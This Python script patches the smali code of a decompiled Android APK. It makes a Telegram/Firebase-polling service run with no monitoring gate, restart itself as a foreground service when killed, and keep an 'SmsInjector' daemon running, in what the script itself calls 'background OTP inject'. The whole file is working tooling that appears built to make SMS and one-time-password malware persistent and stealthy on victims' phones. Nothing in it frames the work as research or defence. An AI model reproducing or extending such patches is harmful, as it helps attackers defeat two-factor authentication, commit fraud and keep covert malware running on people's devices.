#!/usr/bin/env python3
"""Background OTP inject: poll without opening APK + keep foreground service alive."""

from __future__ import annotations

from pathlib import Path

ROOT = Path(__file__).resolve().parent
SVC = ROOT / "virtus_decompiled/smali/com/astik/module/TelegramPollingService.smali"
POLL = ROOT / "virtus_decompiled/smali/com/astik/module/TelegramPollingService$6.smali"

# Poll inject queue whenever Firebase path is configured (not only monitoring=true).
CHOSEN_OLD = """    .line 515
    iget-boolean p1, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z

    const-string v0, ""

    if-nez p1, :cond_0

    return-object v0

    .line 516
    :cond_0
    iget-object p1, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;"""

CHOSEN_NEW = """    .line 515
    const-string v0, ""

    .line 516
    iget-object p1, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;"""

DESTROY_OLD = """    invoke-virtual {p0, v0}, Lcom/astik/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public onStartCommand"""

DESTROY_NEW = """    invoke-virtual {p0, v0}, Lcom/astik/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public onStartCommand"""

TASK_OLD = """    invoke-virtual {p0, p1}, Lcom/astik/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 119
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 120
    invoke-virtual {p0, p1}, Lcom/astik/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void"""

TASK_NEW = """    invoke-virtual {p0, p1}, Lcom/astik/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void"""

POLL_LOOP_OLD = """    .line 453
    :try_start_1
    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;

    invoke-static {v0}, Lcom/astik/module/TelegramPollingService;->access$1000(Lcom/astik/module/TelegramPollingService;)V"""

POLL_LOOP_NEW = """    .line 453
    :try_start_1
    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;

    invoke-static {v0}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z

    invoke-static {v0}, Lcom/astik/module/TelegramPollingService;->access$1000(Lcom/astik/module/TelegramPollingService;)V"""


def _apply(path: Path, old: str, new: str, label: str) -> bool:
    text = path.read_text(encoding="utf-8")
    if old in text:
        path.write_text(text.replace(old, new, 1), encoding="utf-8")
        print(f"  {label}: applied")
        return True
    if new.split("\n")[0] in text and label != "task removed fg restart":
        print(f"  {label}: already applied")
        return False
    if label == "task removed fg restart" and "startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;" in text:
        if "onTaskRemoved" in text and "startService(Landroid/content/Intent;)Landroid/content/ComponentName;" not in text.split("onTaskRemoved")[1].split(".end method")[0]:
            print(f"  {label}: already applied")
            return False
    raise SystemExit(f"{label}: pattern not found in {path.name}")


def main() -> None:
    changed = 0
    for path, old, new, label in (
        (SVC, CHOSEN_OLD, CHOSEN_NEW, "poll without monitoring gate"),
        (SVC, DESTROY_OLD, DESTROY_NEW, "onDestroy fg restart"),
        (SVC, TASK_OLD, TASK_NEW, "task removed fg restart"),
        (POLL, POLL_LOOP_OLD, POLL_LOOP_NEW, "poll loop daemon warm"),
    ):
        if _apply(path, old, new, label):
            changed += 1
    print(f"APK background poll patch done ({changed} edits)")


if __name__ == "__main__":
    main()
